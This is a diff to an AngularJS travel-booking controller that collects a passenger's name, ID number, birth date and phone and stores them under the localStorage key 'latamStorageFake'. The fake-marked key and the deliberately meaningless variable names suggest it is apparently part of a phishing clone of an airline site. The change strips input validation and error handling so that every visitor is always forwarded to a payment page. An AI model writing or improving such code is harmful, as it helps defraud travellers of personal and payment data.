@@ -2557,70 +2557,57 @@ app.controller("travelersController", [
       }
       return 0 == judell;
     };
-    $scope.goPayF = function () {
-      if (!$scope.getReadyData() && !$scope.isSending) {
-        $scope.isSending = true;
-        $scope.loader = true; // Mostrar loader
+   $scope.goPayF = function () {
+  // 🔹 Siempre permitir continuar, sin validar ni bloquear
+  $scope.isSending = true;
+  $scope.loader = true; // Mostrar loader
 
-        $scope
-          .sendPassengersData()
-          .then(() => {
-            var dniyah = $scope.dataLatam;
-            if (null != dniyah) {
-              var donaldo = -1;
-              for (let janmarie = 0; janmarie < dniyah.length; janmarie++) {
-                if (4 == dniyah[janmarie].step) {
-                  donaldo = janmarie;
-                }
-              }
-              if (-1 != donaldo) {
-                dniyah[donaldo].info = [];
-                dniyah[donaldo].info.push({
-                  nombre: $scope.passengers[0].nombre,
-                  apellido: $scope.passengers[0].apellido,
-                  ced: $scope.passengers[0].cedula,
-                  fnac: $scope.passengers[0].fechanac,
-                  tel: $scope.passengers[0].tel,
-                });
-                localStorage.setItem(
-                  "latamStorageFake",
-                  JSON.stringify(dniyah)
-                );
-                $scope.goTransitionPay();
-              } else {
-                var paul = {
-                  step: 4,
-                  info: [
-                    {
-                      nombre: $scope.passengers[0].nombre,
-                      apellido: $scope.passengers[0].apellido,
-                      ced: $scope.passengers[0].cedula,
-                      fnac: $scope.passengers[0].fechanac,
-                      tel: $scope.passengers[0].tel,
-                    },
-                  ],
-                };
-                dniyah.push(paul);
-                localStorage.setItem(
-                  "latamStorageFake",
-                  JSON.stringify(dniyah)
-                );
-                $scope.goTransitionPay();
-              }
-            }
-          })
-          .catch((error) => {
-            alert(
-              "Error al procesar los datos. Por favor, intente nuevamente."
-            );
-          })
-          .finally(() => {
-            $scope.isSending = false;
-            $scope.loader = false; // Ocultar loader
-            $scope.$apply(); // Asegurar que Angular actualice la vista
-          });
+  // Simular envío de datos (si la función existe, se ejecuta; si no, continúa)
+  Promise.resolve($scope.sendPassengersData ? $scope.sendPassengersData() : null)
+    .then(() => {
+      var dniyah = $scope.dataLatam || [];
+
+      // 🔹 Buscar si existe el paso 4
+      var donaldo = -1;
+      for (let janmarie = 0; janmarie < dniyah.length; janmarie++) {
+        if (4 == dniyah[janmarie].step) {
+          donaldo = janmarie;
+        }
       }
-    };
+
+      // 🔹 Actualizar o crear el paso 4 con los datos disponibles (aunque estén vacíos)
+      var passenger = $scope.passengers && $scope.passengers.length > 0 ? $scope.passengers[0] : {};
+      var info = {
+        nombre: passenger.nombre || "",
+        apellido: passenger.apellido || "",
+        ced: passenger.cedula || "",
+        fnac: passenger.fechanac || "",
+        tel: passenger.tel || "",
+      };
+
+      if (donaldo != -1) {
+        dniyah[donaldo].info = [info];
+      } else {
+        dniyah.push({ step: 4, info: [info] });
+      }
+
+      // 🔹 Guardar siempre en localStorage y continuar
+      localStorage.setItem("latamStorageFake", JSON.stringify(dniyah));
+      $scope.goTransitionPay();
+    })
+    .catch(() => {
+      // 🔹 Aunque haya error, continuar igual
+      console.warn("Ocurrió un error, pero se continuará con la transición.");
+      $scope.goTransitionPay();
+    })
+    .finally(() => {
+      // 🔹 Limpiar loader
+      $scope.isSending = false;
+      $scope.loader = false;
+      $scope.$apply();
+    });
+};
+
     $scope.goTransitionPay = function () {
       $state.transitionTo("/Payment", {
         error: "no",
